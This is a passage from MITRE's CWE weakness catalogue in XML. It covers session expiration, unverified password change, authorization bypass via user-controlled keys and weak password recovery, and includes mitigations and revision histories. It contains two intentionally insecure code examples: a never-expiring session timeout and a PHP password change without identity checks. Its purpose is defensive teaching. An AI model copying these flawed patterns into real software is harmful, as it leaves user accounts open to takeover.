               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Detection_Factors, Potential_Mitigations, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">Unsafe URL Redirection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">URL Redirection to Untrusted Site</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">URL Redirection to Untrusted Site (aka 'Open Redirect')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="613" Name="Insufficient Session Expiration" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>According to WASC, "Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization."</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="287" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="287" View_ID="699"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Set sessions/credentials expiration date.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following snippet was taken from a J2EE web.xml deployment descriptor in which the session-timeout parameter is explicitly defined (the default value depends on the container). In this case the value is set to -1, which means that a session will never expire.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>&lt;web-app&gt;<xhtml:div style="margin-left:10px;">
                        <xhtml:div>[...snipped...]<xhtml:br/>
                           <xhtml:br/>&lt;session-config&gt;<xhtml:div style="margin-left:10px;">
                              <xhtml:div>&lt;session-timeout&gt;-1&lt;/session-timeout&gt;</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>&lt;/session-config&gt;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>&lt;/web-app&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>47</Entry_ID>
               <Entry_Name>Insufficient Session Expiration</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Other">The lack of proper session expiration may improve the likely success of certain attacks. For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser's back button to access web pages previously accessed by the victim.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>WASC</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="620" Name="Unverified Password Change" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.</Description>
         <Extended_Description>This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>When prompting for a password change, force the user to provide the original password in addition to the new password.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use "forgotten password" functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-56">
               <Intro_Text>This code changes a user's password.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$user = $_GET['user'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>SetUserPassword($user, $pass);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-0681</Reference>
               <Description>Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0944</Reference>
               <Description>Web application password change utility doesn't check the original password.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0944</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP31</Entry_ID>
               <Entry_Name>Missing authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page&#xA;                  279"/>
         </References>
         <Content_History>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Other_Notes, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="639" Name="Authorization Bypass Through User-Controlled Key" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.</Description>
         <Extended_Description>
            <xhtml:p>Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.</xhtml:p>
            <xhtml:p>For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.</xhtml:p>
            <xhtml:p>One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="862" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="862" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Insecure Direct Object Reference</Term>
               <Description>The "Insecure Direct Object Reference" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal (CWE-22). Within the context of vulnerability theory, there is a similarity between the OWASP concept and CWE-706: Use of Incorrectly-Resolved Name or Reference.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Horizontal Authorization</Term>
               <Description>"Horizontal Authorization" is used to describe situations in which two users have the same privilege level, but must be prevented from accessing each other's resources. This is fairly common when using key-based access to resources in a multi-user context.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Access control checks for specific user data or functionality can be bypassed.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Horizontal escalation of privilege is possible (one user can view/modify information of another user).</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Vertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Description, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2011-03-29">Access Control Bypass Through User-Controlled Key</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="640" Name="Weak Password Recovery Mechanism for Forgotten Password" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.</Description>
         <Extended_Description>
            <xhtml:p>It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.</xhtml:p>
            <xhtml:p>This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>The system's security functionality is turned against the system by the attacker.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use standard weak security questions and use several security questions.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Assign a new temporary password rather than revealing the original password.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>49</Entry_ID>
               <Entry_Name>Insufficient Password Recovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="50"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page&#xA;                  279"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry might be reclassified as a category or "loose composite," since it lists multiple specific errors that can make the mechanism weak. However, under view 1000, it could be a weakness under protection mechanism failure, although it is different from most PMF issues since it is related to a feature that is designed to bypass a protection mechanism (specifically, the lack of knowledge of a password).</Note>
            <Note Type="Maintenance">This entry probably needs to be split; see extended description.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Maintenance_Notes, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
